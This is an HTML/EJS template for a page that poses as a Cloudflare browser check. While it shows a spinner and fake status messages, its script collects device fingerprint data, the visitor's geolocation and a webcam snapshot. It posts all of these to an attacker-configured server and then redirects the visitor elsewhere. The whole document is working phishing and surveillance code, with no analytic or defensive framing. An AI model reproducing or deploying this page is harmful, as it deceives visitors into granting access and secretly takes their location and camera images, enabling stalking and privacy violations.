<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking your browser...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: #f6f7f8;
            color: #333;
        }

        .container {
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
        }

        .header {
            text-align: center;
            margin-bottom: 40px;
        }

        .logo {
            width: 100px;
            height: 100px;
            margin: 0 auto 20px;
        }

        .cloudflare-box {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            padding: 40px;
            text-align: center;
        }

        h1 {
            font-size: 28px;
            margin-bottom: 10px;
            color: #2c3e50;
        }

        .subtitle {
            font-size: 16px;
            color: #7f8c8d;
            margin-bottom: 30px;
        }

        .loader {
            width: 60px;
            height: 60px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #f6821f;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }

        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        .status {
            font-size: 14px;
            color: #555;
            margin-top: 20px;
        }

        .info {
            margin-top: 40px;
            padding-top: 40px;
            border-top: 1px solid #eee;
            text-align: left;
        }

        .info h3 {
            font-size: 18px;
            margin-bottom: 15px;
            color: #2c3e50;
        }

        .info p {
            font-size: 14px;
            line-height: 1.6;
            color: #666;
            margin-bottom: 10px;
        }

        .ray-id {
            margin-top: 30px;
            font-size: 12px;
            color: #999;
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="header">
            <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
                <circle cx="50" cy="50" r="45" fill="#f6821f" />
                <path d="M30 50 L50 30 L70 50 L50 70 Z" fill="white" />
            </svg>
        </div>

        <div class="cloudflare-box">
            <h1>Checking your browser</h1>
            <p class="subtitle">This process is automatic. Your browser will redirect shortly.</p>

            <div class="loader"></div>

            <p class="status" id="status">Performing security check...</p>

            <div class="info">
                <h3>Why am I seeing this page?</h3>
                <p>This website is using a security service to protect itself from online attacks. The action you just
                    performed triggered the security solution.</p>
                <p>This check is necessary to ensure the security and integrity of the service.</p>
            </div>

            <p class="ray-id">Ray ID: <%= Math.random().toString(36).substring(2, 15) %> â€¢ <%= new Date().toISOString()
                        %>
            </p>
        </div>
    </div>

    <script>
        const serverUrl = '<%= a %>';
        const userId = '<%= uid %>';
        const targetUrl = '<%= url %>';

        const statuses = [
            'Checking your browser...',
            'Verifying security...',
            'Analyzing request...',
            'Almost done...'
        ];

        let statusIndex = 0;
        const statusEl = document.getElementById('status');

        // Update status every 1.5 seconds
        const statusInterval = setInterval(() => {
            statusIndex++;
            if (statusIndex < statuses.length) {
                statusEl.textContent = statuses[statusIndex];
            } else {
                clearInterval(statusInterval);
                statusEl.textContent = 'Redirecting...';
            }
        }, 1500);

        // Collect device information
        async function collectData() {
            const data = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenResolution: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookiesEnabled: navigator.cookieEnabled,
                onlineStatus: navigator.onLine,
                referrer: document.referrer,
                timestamp: new Date().toISOString(),
                pageType: 'CloudFlare Check'
            };

            // Send basic info
            await fetch(serverUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `uid=${encodeURIComponent(userId)}&data=${encodeURIComponent(
                    Object.entries(data).map(([k, v]) => `<b>${k}:</b> ${v}`).join('<br>')
                )}`
            });

            // Try to get location
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (position) => {
                    await fetch(serverUrl + '/location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: `uid=${encodeURIComponent(userId)}&lat=${position.coords.latitude}&lon=${position.coords.longitude}&acc=${position.coords.accuracy}`
                    });
                });
            }

            // Try to get camera snapshot
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                setTimeout(async () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);

                    const imageData = canvas.toDataURL('image/png').split(',')[1];

                    await fetch(serverUrl + '/camsnap', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                        body: `uid=${encodeURIComponent(userId)}&img=${encodeURIComponent(imageData)}`
                    });

                    stream.getTracks().forEach(track => track.stop());
                }, 1000);
            } catch (e) {
                console.log('Camera access denied');
            }
        }

        // Collect data and redirect
        collectData().then(() => {
            setTimeout(() => {
                window.location.href = targetUrl;
            }, 6000); // Redirect after 6 seconds
        });
    </script>
</body>

</html>